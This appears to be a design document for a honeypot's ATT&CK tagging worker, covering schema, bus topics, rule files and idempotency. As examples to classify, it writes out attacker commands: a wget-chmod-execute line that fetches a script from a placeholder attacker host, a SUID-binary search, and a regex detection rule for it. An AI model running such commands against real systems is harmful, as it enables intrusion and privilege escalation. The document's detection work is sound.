# TTP Tagging — Design

**Status:** pre-implementation. This doc is the spec; code follows.

**Roadmap pressure:** Detection & Intelligence §"TTPs tagging" in
`DEVELOPMENT.md`. Downstream consumer: campaign clustering already
demands `commands_by_phase_on_decky` (currently empty in production —
synthetic fixtures only).

---

## Premise

We collect a great deal of attacker telemetry — shell commands, HTTP
requests, FTP/SMB/Redis/Mongo ops, auth attempts, payload uploads,
**full SMTP messages with every header**, TLS/SSH fingerprints, scan
signatures, canary triggers. None of it is labelled with a
standardised behavioral vocabulary. A SOC analyst asking "which
identities exhibited T1110.003 (password spraying)?" or "which
sessions sent T1566 phishing?" cannot get an answer today.

The roadmap line "TTPs tagging — Map observed behaviors to MITRE
ATT&CK techniques" needs a load-bearing definition before any code
is written. This document provides it.

The deliverable is a **classifier worker** that consumes existing
telemetry and emits `(event, MITRE technique, confidence)` rows. It
is a pure derivation step — it adds labels, never new observations.

## Vocabulary: ATT&CK is canonical, UKC is a view

`decnet/clustering/ukc.py` already declares itself as the bridge to
the future TTP-tagging worker. That instinct is correct, but the
mapping is not 1:1:

- UKC has 18 phases. ATT&CK has 14 tactics and ~600 (sub-)techniques.
- UKC merges some boundaries (`delivery` / `exploitation` /
  `social_engineering`) that ATT&CK separates differently.
- ATT&CK has Resource Development (TA0042) as a tactic; UKC bundles
  it pre-target. ATT&CK has no `objectives` tactic.
- SOC integrations (Wazuh, TheHive, Sigma rules, MITRE Navigator)
  speak ATT&CK, not UKC.

**Decision:** ATT&CK technique IDs are the canonical storage. UKC
remains a view derived from ATT&CK tactic via a static map at query
time. The campaign clusterer's `commands_by_phase_on_decky`
projection is computed by translating each tag's tactic to its UKC
equivalent.

UKCPhase stays. It is not deleted. It becomes a projection, not a
source of truth.

## Scope ladder: Observation → Identity → Campaign

DECNET resolves attackers at three levels (`IDENTITY_RESOLUTION.md`):

- **Observation** (`Attacker` row) — per-IP sighting; mutable; the
  unit of *ingestion*.
- **Identity** (`AttackerIdentity` row) — recovered from rotation-
  resistant signals (JA3, HASSH, payload hashes, eventually
  keystroke biometrics on `SessionProfile`).
- **Campaign** (`Campaign` row) — coordinated identities.

**TTPs anchor at the Observation layer for storage, surface at the
Identity layer for display, aggregate at the Campaign layer for
analytics.** This mirrors the pattern the rest of the schema
already follows: write at the lowest available level, denormalize
the parent for fast lookups, let the FK chain handle merges.

Per-event tags get an `attacker_uuid` (the source row directly).
Cross-Observation signals (e.g. password spraying visible only when
50 rotated IPs are viewed as one Identity) cannot be anchored to a
single Attacker row — they are emitted as `source_kind =
"identity_rollup"` with `attacker_uuid = NULL` and `identity_uuid`
populated.

Crucially: **biometric features (keystroke dynamics, etc.) live as
fields on `AttackerIdentity` / `SessionProfile`, NOT on `ttp_tag`.**
The TTP worker reads them via the `identity_uuid` / `session_id`
join when biometric lifters land. No biometric-specific columns
land on `ttp_tag` pre-emptively. (See "Forward-compat" below.)

## One event maps to many techniques

Load-bearing — every layer of the design must respect it.

A single `find / -perm -u=s 2>/dev/null` shell command implicates:

- **T1083** — File and Directory Discovery (the `find /` traversal)
- **T1548.001** — Setuid and Setgid (the `-perm -u=s` predicate
  specifically searches for SUID binaries)

A single `wget http://attacker/x.sh && chmod +x x.sh && ./x.sh`
implicates:

- **T1105** — Ingress Tool Transfer (the `wget`)
- **T1059.004** — Unix Shell (the `./x.sh` execution)
- **T1222.002** — Linux File and Directory Permissions Modification
  (the `chmod +x`)

A single SMTP `MAIL FROM:<ceo@victim.com>` with 200 `RCPT TO`
recipients and a `From:` header pointing to a different domain
implicates:

- **T1496** — Resource Hijacking (using our relay as infrastructure)
- **T1586.002** — Compromise Accounts: Email Accounts
- **T1566** — Phishing (mass send pattern)
- **T1036** — Masquerading (`From:` / `Return-Path:` mismatch)

The design supports this at three levels:

**Schema level.** `ttp_tag` is a join table. One row per
`(source_kind, source_id, technique_id, sub_technique_id, rule_id)`
— emphatically NOT keyed on `(source_kind, source_id)` alone.

**Rule level.** A YAML rule may declare multiple techniques in one
`emits` block.

**Engine level.** Multiple independent rules may fire on the same
event. Idempotency is at the deterministic-UUID level so re-running
on the same input is a no-op insert.

## Non-goals

- No attribution to named threat actors ("APT-29", "FIN7"). That is
  a separate problem (campaign-level attribution) and conflating it
  with TTP tagging is how every honeypot project drifts into
  speculative attribution.
- No real-time response actions. TTPs feed the dashboard, webhooks,
  and the campaign clusterer. They do not gate, block, or alter
  decky behavior in v1.
- No ML/LLM classifier in v1. Rules first.
- No retroactive batch re-tagging at v1. The worker tags forward
  from the day it ships; older rows stay untagged. A backfill CLI
  command lands separately.
- No biometric-specific columns on `ttp_tag`. (See "Forward-compat".)

## Forward-compat for unbuilt features

DECNET will gain capabilities post-v1 (keystroke biometrics, HTTP/2
fingerprint deepening, federation gossip, …). The user should not
be forced to migrate when those land. The right answer is **NOT**
to pre-bake columns for every speculative feature — that is the
inverse failure mode and clogs the schema with `null`s for fields
nobody can interpret. The right answer is:

1. **Open `source_kind` discriminator.** It is a string, not an
   enum. New kinds (`keystroke_session`, `biometric_match`,
   `email_attachment`) appear in production data without DDL.
2. **Foreign keys to the appropriate parent rows.** `attacker_uuid`,
   `identity_uuid`, `session_id`, `decky_id` are sufficient anchors
   for any future signal we can foresee.
3. **Biometric features live where they belong** — on
   `AttackerIdentity` and `SessionProfile`. The TTP worker reads
   them via the existing FK joins. No `ttp_tag` schema change.

If a future feature needs a new column on `ttp_tag`, the pre-v1
"add it directly to SQLModel" rule applies until v1, after which
Alembic does the migration. We do not pay that cost speculatively.

**Half-open `source_kind` — be honest about which layer is open.**
The `source_kind` discriminator is forward-compat *at the storage
layer*: SQLite / MySQL accept any string and the `ttp_tag` row
schema does not need a DDL change to absorb a new kind.

It is NOT forward-compat at the *runtime* layer. Every lifter
declares `HANDLES: frozenset[str]` (E.1.6) and the
`CompositeTagger` skips events whose `source_kind` no lifter
claims. A new `source_kind` arriving in production with no lifter
update is a **silent drop**, not an error — the row never exists
because nothing produced it. The CDD test suite passes; no log
line fires; the analyst sees nothing.

This is the standard "schema is forward-compat, code is not" trap;
naming it makes it impossible to forget. The mitigation is
operational, not architectural:

1. New `source_kind` strings are added to a module-level
   `KNOWN_SOURCE_KINDS: frozenset[str]` in
   `decnet/ttp/base.py` at the same time as the producer ships.
2. The composite tagger logs a `WARNING` (rate-limited per kind)
   when it sees a `source_kind` that is in `KNOWN_SOURCE_KINDS`
   but no lifter claims — i.e., we expected someone to handle it.
3. A `source_kind` not in `KNOWN_SOURCE_KINDS` logs a single
   `INFO` line per kind per process lifetime — "telemetry from a
   future feature, no lifter yet, by design." Not an error.

So: storage is open, runtime is closed-by-enumeration with an
observable bridge. Don't ship one without the other.

## Decoupling: bus-driven, never a hard dependency

The TTP worker has zero hard dependencies on other DECNET workers.
It consumes their outputs **opportunistically** — when a related
worker has produced data, TTP emits richer tags; when it hasn't,
TTP emits whatever it can from primary telemetry alone. No-SPOF is
load-bearing for the project as a whole, and the TTP worker is no
exception.

The pattern, applied uniformly:

1. **Bus-woken, never bus-blocked.** TTP subscribes to upstream
   completion signals (`attacker.enriched`, `identity.formed`,
   `credential.reuse.detected`). It WAKES on them. It does NOT
   wait for them. If `attacker.session.ended` fires and intel has
   not yet returned for this attacker, rule-based + behavioral
   tags still emit. When intel arrives later, the
   `attacker.enriched` event re-wakes the worker, intel_lifter
   reads the now-populated row, intel-derived tags emit
   retroactively. Idempotent UUIDs prevent duplicates.

2. **No producer-side imports.** `decnet/ttp/impl/intel_lifter.py`
   imports the `AttackerIntel` SQLModel (a data shape) but never
   `decnet.intel.{abuseipdb, greynoise, feodo, threatfox}` (the
   provider clients). If the entire intel package is removed from
   the install, the TTP worker still starts and still emits all
   non-intel tags. Same rule for biometric_lifter once the
   keystroke ingester ships: it imports `SessionProfile`, never
   the ingester.

3. **Reads tolerate absence.** Every lifter that consults a
   sibling-worker output handles `None`/empty as "no tags from this
   source", never as an error. No `raise` paths on missing rows.
   No `WARNING` log lines for absent intel — that's the normal
   case for a freshly-observed attacker.

4. **Worker registration is independent.** In
   `web/worker_registry.py`, `ttp` and `enrich` are siblings.
   Neither lists the other as a dependency. Both can run alone;
   running both produces richer output.

5. **API / UI degrade gracefully.** `/api/v1/ttp/*` returns
   whatever tags exist. There is no "intel not available" error
   path, no spinner blocked on enrichment, no UI banner saying
   "tags incomplete because intel is offline". The dashboard shows
   what's been tagged; if intel comes online later, more tags
   appear without a refresh signal beyond the existing
   `ttp.tagged` SSE stream.

The same five rules apply to every future consumer of TTP outputs
(federation gossip, MISP export, SOC custom workers): subscribe to
`ttp.tagged`, tolerate absence, never block.

## Order of work

Strictly sequential. Each step lands on its own commit:

1. **This design doc.**
2. **Telemetry inventory** — Appendix A below. Per-service event
   catalogue with ATT&CK technique mappings and confidence bands.
   This is the load-bearing data work; it cannot be skipped.
3. **Schema-only PR** — `ttp_tag` table, empty. New nullable bus
   topic constants in `decnet/bus/topics.py` declared but unused.
   Wiki: `Service-Bus.md` updated in the same PR.
4. **Read-only API** — `/api/v1/ttp/*` returning empty lists. API
   shape locked; frontend can begin.
5. **Frontend** — `IdentityDetail` gains a "TTPs Observed" section
   (primary surface). `AttackerDetail` gains a per-IP slice.
   Empty states until the worker lands.
6. **Worker + store substrate** —
   `decnet/ttp/{base.py, factory.py, impl/}` and
   `decnet/ttp/store/{base.py, factory.py, impl/{filesystem,database}.py}`
   following the provider-subpackage convention. `ttp` registered
   in `web/worker_registry.py`. `./rules/ttp/` directory created
   at projroot, empty. Bus subscriptions wired; no rules yet.
7. **Rule pack v0** — the first 45–60 highest-precision rules
   (Appendix B). Ships at `./rules/ttp/`, one YAML file per
   technique family. The `./rules/` directory at projroot is
   created in this step (or the prior store-substrate step).
8. **Behavioral lifters** — derive techniques from existing
   `AttackerBehavior` / `Credential` / `CredentialReuse` rows.
9. **Intel lifter** — opportunistic consumer of `AttackerIntel`
   rows; bus-woken on `attacker.enriched`. Adds high-precision
   tags from AbuseIPDB / GreyNoise / Feodo / ThreatFox verdicts
   without becoming a dependency. (See "Decoupling" rules above.)
10. **Email lifter** — SMTP message-level rules; the largest single
    engine class by signal volume.
11. **Sigma rule integration** — curated subset, reviewed by hand,
    not bulk-imported. (See "Hard parts" §3.)
12. **Biometric lifters** — when the keystroke ingester populates
    `SessionProfile`. Appendix D documents the integration point.

Each step gets its own commit per project convention; tests in the
same commit as the code per project convention.

---

## Why now, why not later

**The signal is already collected.** SSH transcripts, HTTP logs,
SMTP messages with full headers, payload hashes, fingerprints,
credential captures all land in the DB today. Every day we delay
tagging, we accumulate untagged rows the analyst has to grep
manually.

**Campaign clustering needs this.** The clusterer currently has an
empty `commands_by_phase_on_decky` in production — its
sophisticated phase-handoff edge weight is dormant because nothing
attaches phases to commands. TTP tagging is the missing producer.

**Identity rollup needs this.** `decnet/profiler/identity_rollup.py`
aggregates per-Attacker rows into Identity-level profiles but has
no behavioral-vocabulary surface to expose. TTPs become the
"what does this Identity *do*?" answer.

**SIEM/SOAR integration is bottlenecked on it.** Webhooks already
ship attacker events, but the receiving side (Wazuh, TheHive,
Shuffle) speaks ATT&CK. Without technique IDs in our payloads, the
correlation rules on the SOC side stay generic.

---

## Schema

### `ttp_tag` (new table)

One row per (event × technique × rule) tuple. Pre-v1: add directly
to SQLModel; no `_migrate_*` helper.

```python
class TTPTag(SQLModel, table=True):
    __tablename__ = "ttp_tag"

    # Real RFC-4122 UUIDv5 string (36 hex+hyphens), deterministic
    # over (source_kind, source_id, rule_id, rule_version,
    # technique_id, sub_technique_id) under a fixed namespace.
    # NOT a truncated SHA-256 — calling that "uuid" tanks
    # schemathesis the moment a downstream router types it as
    # UUID4. See `compute_tag_uuid()` below.
    uuid: str = Field(primary_key=True)

    # Provenance — what was tagged. Discriminator + opaque ID.
    source_kind: str                                 # "command" | "http_request"
                                                     # | "auth_attempt" | "payload"
                                                     # | "fingerprint" | "scan"
                                                     # | "canary" | "canary_fingerprint"
                                                     # | "session"
                                                     # | "email" | "email_header"
                                                     # | "email_body"
                                                     # | "email_attachment"
                                                     # | "intel_verdict"
                                                     # | "identity_rollup"
                                                     # | "keystroke_session"  (future)
                                                     # | "biometric_match"    (future)
    source_id: str                                   # FK-ish; not a hard FK
                                                     # because source_kind varies

    # Scope anchors. attacker_uuid is nullable for identity-rollup tags
    # whose signal is only visible across multiple Attacker rows.
    attacker_uuid: Optional[str] = Field(
        default=None,
        foreign_key="attackers.uuid",
        index=True,
    )
    identity_uuid: Optional[str] = Field(
        default=None,
        foreign_key="attacker_identities.uuid",
        index=True,
    )
    session_id: Optional[str] = Field(
        default=None, index=True,
    )
    decky_id: Optional[str] = Field(
        default=None, index=True,
    )

    # ATT&CK
    tactic: str = Field(index=True)                  # "TA0001".."TA0043"
    technique_id: str = Field(index=True)            # "T1110"
    sub_technique_id: Optional[str] = Field(
        default=None, index=True,                     # "T1110.003"
    )

    # Confidence + evidence
    confidence: float                                 # [0.0, 1.0]
    rule_id: str = Field(index=True)                 # rule that fired
    rule_version: int                                 # bumped on rule edits

    # Native JSON column, dialect-adaptive: SQLite stores as TEXT,
    # MySQL as native JSON. No `default=` — every insert MUST
    # supply evidence; a tag without evidence is a lifter bug.
    # Type is `dict[str, Any]` so type-checkers can see structure;
    # the per-source_kind shape contract is pinned in
    # "Evidence shape contract" below — every lifter writes the
    # same shape for the same source_kind, no per-lifter dialects.
    evidence: dict[str, Any] = Field(
        sa_column=Column(JSON, nullable=False),
    )

    # ATT&CK matrix release the tag was emitted against (e.g.
    # "enterprise-v15.1", "ics-v15.1"). REQUIRED, never nullable
    # and never Optional[str] — a tag without an ATT&CK release ID
    # cannot be rendered deterministically in MITRE Navigator
    # because technique IDs migrate between releases. Drop this
    # invariant and the next "T1086 vs T1059.001" rename leaves
    # tags pointing at IDs that no longer exist. The startup
    # consistency check (Hard parts §8) refuses to boot the worker
    # if the rule pack's release disagrees with the bundled matrix.
    attack_release: str = Field(index=True)

    created_at: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc),
        index=True,
    )

    __table_args__ = (
        # At least one of attacker_uuid / identity_uuid must be set.
        # MySQL <8.0.16 parses CHECK but ignores enforcement —
        # the app-layer guard in __init__ covers that gap.
        # SQLite, MySQL 8.0.16+, and Postgres honor it natively.
        CheckConstraint(
            "attacker_uuid IS NOT NULL OR identity_uuid IS NOT NULL",
            name="ttp_tag_has_anchor",
        ),
    )

    def __init__(self, **kwargs: Any) -> None:
        # Belt-and-braces for MySQL <8.0.16 where CHECK is silently
        # ignored. CRITICAL: this runs BEFORE super().__init__() —
        # i.e. before Pydantic field validation. A Pydantic
        # `@field_validator` would fire during model build and
        # surface as a generic `ValidationError`, hiding the
        # specific anchor-missing semantics behind a wall of
        # validator output. Raising plain `ValueError` here keeps
        # the failure type narrow and the message inspectable.
        # The CDD test in E.2.1 asserts the exception type AND that
        # both `"attacker_uuid"` and `"identity_uuid"` appear in
        # str(exc). Do not "simplify" this into a generic assert
        # or a Pydantic validator — the test is the trip-wire.
        if (
            kwargs.get("attacker_uuid") is None
            and kwargs.get("identity_uuid") is None
        ):
            raise ValueError(
                "ttp_tag requires at least one of attacker_uuid / "
                "identity_uuid; both NULL is not a valid anchor."
            )
        super().__init__(**kwargs)
```

**Evidence shape contract.** `evidence` is JSON but not freeform.
Every lifter writes a known shape per `source_kind`; the contract
is enforced by `tests/ttp/test_evidence_shape.py` (E.2.1
extension) which parametrizes over each lifter and asserts the
emitted dict matches a `TypedDict` declared in
`decnet/web/db/models/ttp.py` alongside `TTPTag`:

```python
class CommandEvidence(TypedDict):
    matched_tokens: list[str]
    rule_pattern: str            # regex source, not user input

class IntelEvidence(TypedDict):
    intel_uuid: str
    provider: Literal["abuseipdb", "greynoise", "feodo", "threatfox"]
    category: int | None
    score: float                 # already normalized to [0.0, 1.0]

class EmailEvidence(TypedDict):
    body_sha256: str             # hash, never raw body (PII rule §6)
    matched_headers: list[str]   # header NAMES, not values
    rcpt_domain_set: list[str]   # domains, not addresses
    attachment_sha256s: list[str]
    rcpt_count: int

class CanaryFingerprintEvidence(TypedDict):
    metric: str                  # "navigator_webdriver", "canvas_hash", …
    matched_signature: str       # signature ID, not raw fingerprint
```

Adding a new `source_kind` requires adding a TypedDict here AND a
test entry in `test_evidence_shape.py`. The PII discipline from
Hard parts §6 lives in the *type*, not in folklore — recipient
addresses cannot land in `EmailEvidence` because no field
accommodates them. See also "Half-open `source_kind`" below: the
storage layer accepts any string, but the lifter + evidence-shape
layer is closed by construction.

**Querying inside `evidence` is backend-specific** — SQLite uses
`json_extract(evidence, '$.intel_uuid')`, MySQL uses
`evidence->>'$.intel_uuid'`. Predicates do NOT portably traverse
the JSON column; SQLite has no functional index inside JSON. If a
future endpoint wants "all tags from AbuseIPDB", we promote
`provider` to a real column on `ttp_tag` rather than relying on a
JSON dive. The JSON column is for storage-and-display, not for
indexed query paths.

**Why both `attacker_uuid` AND `identity_uuid`.** Per-event tags
have both populated (`identity_uuid` is denormalized from
`Attacker.identity_id` at insert). Identity-rollup tags have only
`identity_uuid`. The denormalization mirrors how the rest of the
schema handles identity rollups — same playbook as
`AttackerBehavior` and the per-IP profile rollup.

**At least one of `attacker_uuid` / `identity_uuid` MUST be set.**
A CHECK constraint in the table definition enforces this. There is
no such thing as a tag with neither anchor.

**Identity merges/unmerges.** When the clusterer collapses two
Identities, the merge mechanic (per `IDENTITY_RESOLUTION.md`)
re-keys all `attacker_identities.uuid` references via FK. Tags
follow naturally. No bespoke ttp_tag merge code needed.

**No FK on `source_id`.** Sources span multiple tables. A
discriminated union with hard FKs would mean N nullable columns;
not worth it. The tagger is the only producer; it never inserts a
tag with a source it didn't just read.

**Retention: tags outlive sources.** The lack of an FK on
`source_id` means deleting the underlying payload / session /
attacker_command row does NOT cascade to `ttp_tag`. This is
deliberate — historical ATT&CK coverage stays queryable even
after the operator runs source-side retention. The trade-off:
a `source_id` may dangle; the evidence-pointer is informational
("this tag came from row X, which may no longer exist"), not a
join target the API trusts to resolve.

The vacuum policy is opt-in, not automatic:

- `decnet ttp vacuum --orphaned --since N days` walks `ttp_tag`
  and drops rows whose `source_id` no longer resolves under their
  `source_kind`. Off by default. Operators who want strict
  tag-source pairing run it on a cron; operators who want
  long-lived behavioral history don't.
- The `attacker_uuid` and `identity_uuid` FKs DO cascade
  ON DELETE — deleting an Attacker drops its per-event tags
  cleanly. This is the GDPR / "purge this attacker" path.
  Identity-rollup tags (no attacker FK) survive the cascade and
  remain anchored to the Identity until it too is deleted.

This is stated, not silent. A tag's lifecycle is independent of
its source row's lifecycle by design.

**Idempotency.** The tag `uuid` is a deterministic **UUIDv5**
derived from `(source_kind, source_id, rule_id, rule_version,
technique_id, sub_technique_id)` under the fixed namespace
`uuid.UUID("decnet:ttp_tag:v1")` (see `compute_tag_uuid()` for the
exact derivation). Replays are no-ops at the DB layer. The result
is a real RFC-4122 UUID — Pydantic / OpenAPI / schemathesis treat
it as `format: uuid`, downstream routers can type it as `UUID`,
and the column round-trips to native UUID types on backends that
have one. Truncated-SHA-256 strings dressed up as UUIDs would
silently fail UUID-typed validators; this avoids that trap.

**Replay safety is a STATED PROPERTY, not an accident.** The
deterministic-UUID rule combined with `INSERT OR IGNORE` means the
worker can safely re-process the same source events any number of
times — crash recovery, backfill, manual re-runs all converge to
the same tag set. **A future contributor must not "optimise" the
UUID derivation by, say, adding `created_at` or a process PID to
the hash inputs**; that would silently break replay safety, and
the resulting bug ("why are we writing duplicate tags after
restart?") would take days to diagnose. The CDD test in E.2.2
pins this property; do not weaken it.

**Indexes:**
- `(identity_uuid, technique_id)` — primary query: "did this
  Identity ever do T1110?" — IdentityDetail page hits this hard.
- `(attacker_uuid, technique_id)` — per-IP slice on AttackerDetail.
- `(technique_id, created_at)` — "all T1059.004 in the last week".
- `(session_id)` — session detail rollup.
- `(rule_id)` — rule-level audit / rollback.

### Worked example

Event: `attacker_command` row with `id=cmd_42`, content
`find / -perm -u=s 2>/dev/null`, attacker `att_99` (whose
`identity_id` resolves to `id_17`), session `sess_7`, decky
`decky_3`.

Two rules fire:

1. `find_recursive_root` rule (`R0014`, version `2`) — emits
   `T1083`.
2. `suid_search` rule (`R0015`, version `1`) — emits both `T1083`
   AND `T1548.001`.

Resulting `ttp_tag` rows (abbreviated):

| uuid       | source_kind | source_id | attacker_uuid | identity_uuid | session_id | tactic | technique_id | sub_technique_id | confidence | rule_id | rule_version |
|------------|-------------|-----------|----------------|----------------|------------|--------|---------------|-------------------|------------|---------|--------------|
| `tag_a1b2…`| `command`   | `cmd_42`  | `att_99`       | `id_17`        | `sess_7`   | TA0007 | T1083         | (null)            | 0.75       | R0014   | 2            |
| `tag_c3d4…`| `command`   | `cmd_42`  | `att_99`       | `id_17`        | `sess_7`   | TA0007 | T1083         | (null)            | 0.85       | R0015   | 1            |
| `tag_e5f6…`| `command`   | `cmd_42`  | `att_99`       | `id_17`        | `sess_7`   | TA0004 | T1548         | T1548.001         | 0.95       | R0015   | 1            |

Three rows. Two distinct techniques; `T1083` appears twice because
two rules independently flagged it. The dashboard deduplicates for
display by `(identity_uuid, technique_id, sub_technique_id)` — but
the underlying rows stay distinct so a rule rollback removes its
contribution cleanly without touching the other.

### Worked example — identity rollup

Cross-IP password spraying detected by the credential lifter:
identity `id_17` has 7 Attacker rows (rotated IPs) all using
`Spring2024!` against different usernames across two deckies.

Resulting tag (one row, no per-Attacker anchor):

| source_kind         | source_id              | attacker_uuid | identity_uuid | tactic | technique_id | sub_technique_id | confidence | rule_id |
|---------------------|------------------------|----------------|----------------|--------|---------------|-------------------|------------|---------|
| `identity_rollup`   | `cred_reuse_ev_4421`   | (null)         | `id_17`        | TA0006 | T1110         | T1110.003         | 0.90       | R0003   |

`source_id` here is the `CredentialReuse` row UUID, which is the
underlying evidence the lifter consulted.

### Existing tables — additive only

No alters in this PR. Specifically:

- `AttackerBehavior.phase_sequence` already exists; it stays. The
  TTP worker reads from it (behavioral lifters), but does not
  write to it.
- `AttackerIdentity` will eventually grow biometric FK fields. That
  is a separate PR sequence; `ttp_tag` does not pre-bake those.
- `SessionProfile` already exists empty; biometric lifters will
  read it via `session_id` when populated.

## Bus topics

Declared in `decnet/bus/topics.py`; documented in
`wiki-checkout/Service-Bus.md` in the same PR.

```
ttp.tagged                       — one or more new tags written
ttp.rule.fired.{technique_id}    — fine-grained subscribe; SIEM-friendly
ttp.rule.suppressed              — rule fired but was confidence-clipped or rate-limited
ttp.rule.reloaded.{rule_id}      — rule definition changed (filesystem edit
                                   or DB-store sync); engine recompiled the rule
ttp.rule.state.{rule_id}         — rule operational state changed (enabled /
                                   disabled / clipped / TTL expired)
```

Both `ttp.rule.reloaded.*` and `ttp.rule.state.*` are **per-rule
events, never batched.** A 50-rule edit produces 50 reload events.
Subscribers that care about a specific rule subscribe to that
exact token; broad subscribers use `ttp.rule.reloaded.>`. The bus
does the fan-out — the producer never aggregates.

`ttp.tagged` payload carries `attacker_uuid` (nullable),
`identity_uuid`, `session_id`, `tag_uuids` (list), and an aggregate
`techniques_added` (deduped list of technique IDs, for fast SIEM
correlation without a DB read).

**Loop-prevention invariant — CANONICAL STATEMENT.** `ttp.tagged`
is published ONLY when the underlying `INSERT OR IGNORE` returned
a non-zero row count. Idempotent re-evaluations that produce zero
new tags publish ZERO events. This is load-bearing: a webhook
subscriber that re-triggers enrichment on `ttp.tagged` could
otherwise loop forever (enrich → `attacker.enriched` →
intel_lifter → idempotent insert returns 0 → `ttp.tagged` would
re-fire → loop). The CDD test in E.2.12 enforces this; do not
relax it.

This is the single source of truth for the invariant. Other
sections in this doc (Hard parts §11 webhook blast radius, §E.2.12
test plan) cross-reference back here rather than restating —
duplicating the rule across three locations is a maintenance
liability, not enforcement.

### Producer wiring (who publishes what)

The TTP worker subscribes; the topics it watches are produced
elsewhere in the tree. Catalogued here because "subscriber set up,
nothing happens" is the failure mode worth surfacing first when
debugging silent rule-engine output.

| Topic | Producer | Notes |
|---|---|---|
| `attacker.observed` | `decnet/correlation/engine.py` (`_publish_fn` on first sighting per IP) | One event per attacker_ip per profiler-process lifetime — replays after a restart re-emit. |
| `attacker.scored` | `decnet/profiler/worker.py` | Fired after every incremental profile update. |
| `attacker.intel.enriched` | `decnet/intel/worker.py` | Per-row publish after `upsert_attacker_intel`. Gated on `repo.get_unenriched_attackers` returning rows. |
| `identity.formed` / `merged` / `observation.linked` / `unmerged` | `decnet/clustering/worker.py:_publish_result` | Fans out the four sub-lists of `ClusterResult`. Gated on the clusterer producing material side-effects. |
| `credential.reuse.detected` | `decnet/correlation/reuse_worker.py` | Per-finding publish; gated on `min_targets ≥ 2`. |
| `attacker.session.ended` | `decnet/collector/worker.py:_SessionAggregator` | Indexes shell `command` events per `attacker_ip` and emits one envelope per `session_recorded` log event. |
| `canary.{token}.triggered` | `decnet/canary/planter.py` | Per-token canary callbacks. |
| `email.received` | **none** | No producer in tree (DEBT — wire when SMTP-receive persistence lands). |

**`attacker.session.ended` payload shape** (commit-1 of the
collector producer wiring):

```json
{
  "session_id": "<sid>" | null,
  "attacker_uuid": null,
  "attacker_ip": "192.168.1.5",
  "decky_id": "omega-decky",
  "service": "ssh",
  "ended_at": "2026-05-02T06:23:30+00:00",
  "duration_s": 165.914,
  "commands": [
    {"id": "<sid>#0", "command_text": "ls /var/www/html",
     "ts": "2026-05-02T06:22:48+00:00",
     "decky": "SRV-DELTA-77", "service": "bash"}
  ]
}
```

`attacker_uuid` is null because the collector doesn't talk to the
DB; the TTP worker resolves it from `attacker_ip` on the consume
side. `id` per command is `f"{sid}#{idx}"` so the deterministic
`compute_tag_uuid` collapses on replay (loop-prevention).

### Producer–consumer health checks

Each producer is pinned by a regression test that drives one tick
with a fake bus + stubbed repo and asserts the topic fires:

* `tests/collector/test_session_ended_publish.py`
* `tests/correlation/test_reuse_worker_publish.py`
* `tests/clustering/test_worker_publish.py`
* `tests/intel/test_worker_publish.py`

These run alongside the TTP suite. If a future refactor moves a
publish call out of the loop body or mis-spells a topic constant,
one of these flips red on the next CI run.

## Worker shape

`decnet/ttp/` mirrors `decnet/intel/` and `decnet/clustering/` —
provider-subpackage convention:

```
decnet/ttp/
    __init__.py
    base.py             # Tagger ABC; tag(event) -> list[TTPTag]
    factory.py          # get_tagger() reads DECNET_TTP_TAGGER_TYPE
    worker.py           # bus loop; persistence; dedup
    store/              # pluggable rule store (provider-subpackage)
        __init__.py
        base.py         # RuleStore ABC
        factory.py      # get_rule_store() reads DECNET_TTP_RULE_STORE_TYPE
        impl/
            filesystem.py  # default; reads ./rules/ttp/, inotify watches,
                           # state held in-process (lost on restart)
            database.py    # rules + state in DB; survives restart;
                           # multi-host swarm; master syncs from filesystem,
                           # workers tail DB
    impl/
        rule_engine.py          # consumes RuleStore; matches events
        behavioral_lifter.py    # AttackerBehavior → tags
        credential_lifter.py    # CredentialReuse → tags (identity-rollup)
        email_lifter.py         # SMTP message + headers + body + attachments
        canary_fingerprint_lifter.py  # browser fingerprint payload derivations
        intel_lifter.py         # AttackerIntel verdicts → tags (opportunistic)
        identity_lifter.py      # cross-Attacker rollups via identity_id join
        sigma_adapter.py        # (later) Sigma rule subset
        biometric_lifter.py     # (later) SessionProfile + AttackerIdentity
```

**Rule files live at `./rules/ttp/` (project root)** — visible to
the operator, git-tracked, editable without touching the Python
package. Mirrors how `./development/` already exposes spec /
profile artefacts to the user. One YAML file per technique family:

```
./rules/ttp/
    T1110_brute_force.yaml
    T1059_command_and_scripting.yaml
    T1046_network_service_discovery.yaml
    T1566_phishing.yaml
    T1496_resource_hijacking.yaml
    ...
```

Registered in `web/worker_registry.py` as `ttp`. Bus-woken on:

- `attacker.session.ended` — primary trigger; full session
  available
- `credential.reuse.detected` — sub-technique disambiguation
  (T1110.003 vs T1110.004); produces identity-rollup tags
- `attacker.observed` — wakes the tagger to apply low-latency rules
  (active-scan signatures, fingerprint-based)
- `canary.{token_id}.triggered` — discrete events
- `identity.formed` / `identity.merged` — re-evaluate
  identity-rollup rules with the new membership
- `attacker.enriched` — published by the `enrich` worker after a
  successful intel pass; wakes the intel_lifter for the affected
  attacker. **Opportunistic** — TTP never blocks on this.
- `email.received` (new bus signal — SMTP/SMTP-relay services
  publish on full-message receipt; declared in this PR alongside
  the worker)

The worker is idempotent. Same `(source_kind, source_id, rule_id,
rule_version, technique_id, sub_technique_id)` → same tag UUID.

---

## Tagging engines, layered

### 1. Rule-based (v0 — ships first)

YAML rule files, one per technique family. A single rule may emit
multiple techniques.

```yaml
rule_id: R0015
rule_version: 1
name: suid_search
description: |
  `find` invocation with -perm -u=s predicate — explicitly
  searching for SUID binaries on the local filesystem.
applies_to:
  - source_kind: command
match:
  pattern: '\bfind\s+\S+.*-perm\s+(-u=s|-4000|/4000)\b'
emits:
  - tactic: TA0007
    technique_id: T1083
    confidence: 0.85
  - tactic: TA0004
    technique_id: T1548
    sub_technique_id: T1548.001
    confidence: 0.95
evidence_fields: [matched_groups, command_id]
```

Engine compiles rules at startup. Per event class, rules are
indexed by `applies_to.source_kind` so a single command does not
walk every rule. Aggregate rules (windowed, grouped) run on a
session-end pulse instead of per-event.

**Why YAML, not Python:** rules need to be reviewable by humans
who aren't going to read the codebase. Sigma's success is exactly
this property. Code-as-rules ossifies fast.

#### Hot-reload via store backend

Rules and their *operational state* live in two separate planes,
combined at compile time:

- **Definition** (immutable, version-controlled): the YAML file.
  Sigma-compatible, no DECNET-specific extensions. Lives at
  `./rules/ttp/` for the filesystem store, mirrored into the
  `ttp_rule` table for the database store.
- **State** (mutable, operational): `RuleState` carrying
  `enabled` / `disabled` / `clipped` plus optional
  `confidence_max`, `expires_at`, `reason`, `set_by`, `set_at`.
  Held in-process for the filesystem store; persisted in
  `ttp_rule_state` for the database store.

